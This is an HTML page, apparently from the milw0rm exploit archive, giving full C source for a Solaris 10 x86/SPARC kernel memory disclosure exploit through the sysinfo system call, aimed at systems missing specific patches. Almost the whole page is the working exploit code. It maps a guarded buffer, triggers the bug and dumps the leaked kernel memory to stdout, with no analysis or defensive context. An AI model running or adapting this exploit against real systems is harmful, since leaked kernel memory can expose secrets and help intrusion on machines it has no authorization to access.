<html><head><title>Solaris 10 x86/sparc sysinfo Kernel Memory Disclosure Exploit</title></head><pre>/* 07/2006: public release
 * SPARC Solaris 10 without 118833-09
 * x86   Solaris 10 without 118855-06
 *
 * Solaris sysinfo Kernel Memory Disclosure
 * By qaaz
 */
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/systeminfo.h&gt;

#define PAGE_COUNT	1000

int	main(int argc, char *argv[])
{
	char	*buf, *end;
	int	pg = PAGE_COUNT, pagesz, bufsz;

	fprintf(stderr,
		&quot;---------------------------------\n&quot;
		&quot; Solaris sysinfo Kmem Disclosure\n&quot;
		&quot; By qaaz\n&quot;
		&quot;---------------------------------\n&quot;);

	if (argc &gt; 1) pg = atoi(argv[1]);

	pagesz = getpagesize();

	bufsz = (pg + 1) * pagesz;
	if (!(buf = memalign(pagesz, bufsz))) {
		perror(&quot;malloc&quot;);
		return -1;
	}

	memset(buf, 0, bufsz);
	end = buf + (pg * pagesz);

	fprintf(stderr, &quot;-&gt; [ %p .. %p ]\n&quot;, buf, end);
	fflush(stderr);

	if (mprotect(end, pagesz, PROT_NONE)) {
		perror(&quot;mprotect&quot;);
		return -1;
	}

	sysinfo(SI_SYSNAME, buf, 0);

	while (end &gt; buf &amp;&amp; end[-1] == 0)
		end--;
	fprintf(stderr, &quot;== %d\n&quot;, (int) (end - buf));
	fflush(stderr);

	if (!isatty(1))
		write(1, buf, (size_t) (end - buf));
	return 0;
}

// milw0rm.com [2007-09-01]</pre></html>